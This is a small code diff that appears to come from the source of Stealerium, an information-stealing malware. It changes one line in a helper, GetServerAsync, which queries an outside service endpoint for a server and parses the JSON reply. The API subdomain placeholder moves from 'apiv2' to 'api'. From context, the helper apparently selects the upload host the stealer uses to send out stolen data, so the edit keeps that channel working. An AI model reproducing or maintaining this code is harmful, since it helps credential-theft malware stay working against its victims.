@@ -38,7 +38,7 @@ namespace Stealerium.Helpers
 
         private static async Task<string> GetServerAsync(HttpClient client)
         {
-            var request = await client.GetStringAsync(ServiceEndpoint.Replace("{server}", "apiv2") + "getServer").ConfigureAwait(false);
+            var request = await client.GetStringAsync(ServiceEndpoint.Replace("{server}", "api") + "getServer").ConfigureAwait(false);
             var output = JObject.Parse(request);
             var d = JsonConvert.SerializeObject(output);
             var serverStatus = JsonConvert.DeserializeObject<ApiResponse>(d);
